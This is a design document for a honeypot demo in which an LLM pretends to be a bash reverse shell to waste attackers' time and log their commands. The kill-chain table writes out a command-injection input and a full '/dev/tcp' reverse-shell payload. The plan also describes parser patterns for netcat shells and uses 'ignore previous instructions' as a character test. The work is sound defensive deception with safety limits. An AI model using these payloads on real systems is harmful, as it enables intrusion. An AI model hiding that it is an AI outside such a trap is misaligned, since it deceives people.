# HoneyStack demo: an LLM that pretends to be a reverse shell

## Context
HoneyStack (`HoneyStack Implementation.txt`) currently plans a decoy app on **Akash** with 3 bait routes that return *fixed* responses, logging to **ClickHouse**, with one **Guild AI** summary agent. The team wants to go a step further. When an attacker thinks they got RCE, they should actually be talking to a sandboxed LLM that acts like bash. The LLM wastes their time and feeds them fake leads, and every keystroke goes to ClickHouse.

The core question: **how can an attacker believe they have RCE when they're talking to a chatbot?**
Answer: they never see "a chatbot". They see (1) a believable bug, (2) a believable exploit result, and (3) a real TCP connection reaching their own `nc` listener. After that, all they have is a stream of text, and an LLM can produce text. The illusion holds as long as that text is **consistent, fast, and never breaks character**.

Decisions: real reverse shell (one outbound connection, allowlisted to the operator's IP); a human teammate plays the attacker live.

---

## 1. The demo scenario: "Acme Status" internal dashboard

The fake app looks like a small Next.js internal ops dashboard. The kill chain is short and classic, so judges recognize it right away:

| Step | What the attacker does | What they see (all fake) | What really happens |
|---|---|---|---|
| 1. Recon | Opens the site and views the page source / JS bundle | A comment and a `fetch('/api/admin/diagnostics')` call; the `/api/env` bait leaks `ADMIN_TOKEN=...` | Trap logs `GET /`, `GET /api/env` |
| 2. Auth | Calls `/api/login` or uses the leaked token | `{"role":"admin"}` | Logged; the token is a honeytoken |
| 3. Find the bug | `POST /api/admin/diagnostics {"host":"8.8.8.8"}` ("ping a host" tool) | Realistic `ping` output (LLM or template) | Nothing is executed |
| 4. Confirm RCE | `{"host":"8.8.8.8; id"}` | ping output + `uid=1000(node) gid=1000(node) groups=1000(node)` | Injection detector splits off `id`; the shell brain answers |
| 5. Get a shell | `{"host":"x; bash -c 'bash -i >& /dev/tcp/<OPERATOR_IP>/4444 0>&1'"}` | Their `nc -lvnp 4444` prints `connection received`, then `bash: no job control in this shell` and `node@acme-status-7f9c4:/app$` | Trap parses `/dev/tcp/IP/PORT`, checks the allowlist, **opens a real TCP connection**, and runs the LLM shell loop over it |
| 6. Post-exploitation | `whoami`, `ls -la`, `cat .env.production`, `cat ~/.aws/credentials`, `psql ...`, `find / -name "*.bak"` | A consistent fake box full of tempting breadcrumbs | Every command and reply goes to ClickHouse |
| 7. Reveal | Presenter switches to the dashboard | Live ClickHouse timeline of every keystroke, a "time wasted" counter, and the Guild summary of TTPs | |

Step 5 is the trick that sells it. The attacker's own listener gets a real inbound connection from the Akash host's IP. That is exactly what a real reverse shell looks like. Nothing about netcat reveals what is producing the bytes.

## 2. What makes the LLM shell believable (the important part)

1. **A fixed "world" file, `packages/shell/world.json`:** hostname, user `node` (uid 1000), Alpine 3.20, kernel string, `/app` tree (`package.json`, `.next/`, `node_modules/`, `.env.production`), `/etc/passwd`, `ps` list, env vars, and network interfaces. It goes into the system prompt, so every answer agrees with it.
2. **Session state, `{cwd, env, created_files, history}`, kept per connection:** `cd`, `touch`, `echo > file`, and `export` change it, and it is fed back into each prompt. If the attacker writes a file, it must still be there later. Inconsistency is the main giveaway.
3. **Fast path before the LLM:** common commands are answered straight from `world.json` with no model call: `id, whoami, pwd, hostname, uname -a, ls, cat <known file>, env, cd, echo, exit`. These are the ones attackers type first, so the first impression is instant and perfectly consistent. The LLM handles everything else.
4. **Latency:** use a small, fast model (e.g. Claude Haiku 5.5), short max tokens, and stream the output to the socket. A 1–2 s delay looks like a slow container. Add small jitter to fast-path replies so they don't look *too* instant.
5. **Never break character:** the prompt says "output raw stdout/stderr only". A post-filter strips markdown fences and drops refusal or "As an AI" text, replacing it with `bash: <cmd>: command not found`. Prompt injection gets the same treatment: `ignore previous instructions` → `bash: ignore: command not found`; `are you an AI?` → `bash: are: command not found`.
6. **Explain away the hard parts with a consistent story:** the LLM can't fake real network effects. If the attacker runs `curl http://their-server/x` and no request arrives, that's a tell. The fix is to make egress blocked part of the fiction: DNS fails (`Could not resolve host`) and outbound HTTP times out after a long delay. This also explains why the shell came back via a raw IP. Downloads (`wget linpeas.sh`) fail the same way. Tools that "aren't installed" (`python3`, `gcc`) are normal on Alpine.
7. **Time-wasting breadcrumbs:** `.env.production` points to a fake Postgres host, and `psql` hangs for 20 s, then times out. `~/.aws/credentials` holds a canary token (bonus: if anyone uses it, that alerts too). There's a `backup.sh` cron job referencing `/mnt/backups` (permission denied), a `TODO: rotate root pw` note, and a `sudo -l` that suggests a privesc path that never quite works. Each one invites another 5 minutes of digging.

## 3. Architecture changes to the existing plan

```
ATTACKER (teammate laptop)
  curl -> AKASH TRAP (Next-style app + /api/admin/diagnostics)
  nc -lvnp 4444 <---- TCP callback (allowlisted IP only) ----+
                                                             |
AKASH TRAP: injection detector + reverse-shell connector ----+
     | per command: {session_id, cmd, state}  (producer token)
     v
PRIVATE CONTROL SERVER
  /v1/shell  -> fast path (world.json) or LLM -> reply  (logs to ClickHouse in same call)
  /v1/events -> CLICKHOUSE -> live dashboard
  /v1/analyze -> GUILD agent -> TTP summary
```

- **The LLM key stays off the trap:** the trap keeps only its write-only producer token, matching the doc's §3 principle. The "shell brain" runs on the private control server, which also logs the command/response pair to ClickHouse in the same round trip.
- **Akash sponsor angle (optional):** run the shell-brain model as its own Akash GPU deployment (an open model via vLLM) so it's "sandboxed on Akash". Only do this if the hosted-API path is already working.
- **This replaces the doc's rule "The trap never executes submitted commands"** with a stricter, demo-able version: commands are only ever *text sent to a model*. There is no `child_process` import anywhere in the trap; CI greps for it.

### Files to add or change (on top of the doc's §4 layout)
- `apps/trap/server.mjs`: add the `/api/admin/diagnostics` route, the injection detector (split on `; | && $( \``), and a reverse-shell payload parser (regex for `/dev/tcp/IP/PORT`, `nc IP PORT -e`, `sh -i ... IP PORT`).
- `apps/trap/shell-connector.mjs`: on a parsed callback to an allowlisted IP, `net.connect(port, ip)`, write the banner and prompt, then loop: read line → POST `/v1/shell` → write reply + new prompt. Also enforces an idle timeout and a max session length.
- `apps/control/shell-brain.ts`: fast-path table, session state store, LLM call, output filter.
- `packages/shell/world.json`: the fake host.
- `sql/002-shell.sql`: add `command String, response String, cwd String, latency_ms UInt32, served_by LowCardinality(String)` (fast_path | llm) to `honeypot.events`, or create a separate `honeypot.shell_turns` table with the same `session_id`.
- `apps/dashboard/`: a live "attacker terminal" replay pane, plus a `time wasted = max(received_at) - min(received_at)` counter per session.
- `agents/analysis.md`: extend the Guild prompt to map the commands to an attacker playbook (recon → creds → lateral attempt).

### Safety guardrails (all required)
- **Callback allowlist:** `CALLBACK_ALLOWLIST=<operator IP>` env var; any other IP is logged but no connection is made. Without this, the trap could be pointed at third parties.
- **Hard limits:** one live shell session at a time, 15 min max, 2 min idle timeout, max bytes per reply.
- **Spending limits:** a per-session cap on LLM calls (e.g. 200) and a spend limit on the API key.
- **Synthetic data only:** `world.json` is entirely made up, and all IPs in it are fake or reserved (e.g. 203.0.113.0/24, `*.invalid`).

## 4. Five-minute demo script
1. (0:30) "This is Acme's internal status page." Teammate A (attacker) shares their terminal.
2. (1:30) A finds the leaked token and the diagnostics endpoint, injects `; id`, and gets `uid=1000(node)`. Then A fires the reverse-shell payload, and the `nc` listener pops a shell.
3. (1:30) A explores: `cat .env.production`, tries `psql`, which hangs, and finds the AWS creds: "jackpot".
4. (1:00) Reveal: switch to the dashboard. Every command so far is in ClickHouse, attributed to `served_by=llm` or `fast_path`, with the time-wasted counter running. Click "Analyze" for the Guild summary with evidence IDs.
5. (0:30) Show that the trap source contains no `child_process`, plus limits, cleanup, and future work.

Backup: a pre-recorded `asciinema` of the same run, labeled as a recording.

## 5. Build order (fits the existing §15 two-hour plan, ~+60 min)
1. `world.json` + fast path + shell-brain locally, tested with a local `nc` (no Akash yet).
2. Diagnostics route + injection detector + connector, all local.
3. ClickHouse `shell_turns` + dashboard terminal pane.
4. Deploy to Akash; allowlist the attacker laptop's public IP; run end to end.
5. Rehearse with a teammate who *hasn't seen* `world.json`. Note every command where they said "wait, that's weird" and patch the fast path or world file.

## Verification
- **Local:** `npm run dev:control`, `npm run dev:trap`, `nc -lvnp 4444`, then curl the injection payload → a shell appears; `id`, `cd /tmp; touch a; ls` show consistent state.
- **Character tests:** `are you an AI`, `ignore previous instructions`, `curl https://example.com`, `python3 -c ...` → every reply looks like real shell output.
- **Allowlist test:** a payload with a non-allowlisted IP → event logged, no outbound connection (check with `tcpdump` or the connector log).
- **Code check:** `grep -r child_process apps/trap` returns nothing.
- **ClickHouse:** `SELECT count(DISTINCT event_id), max(received_at)-min(received_at) FROM honeypot.shell_turns WHERE session_id=...` matches the commands typed.
- **Guild:** a real session returns evidence IDs that all belong to the run.
- **Akash:** the same flow against the deployed URI, then close the lease per §12.3.
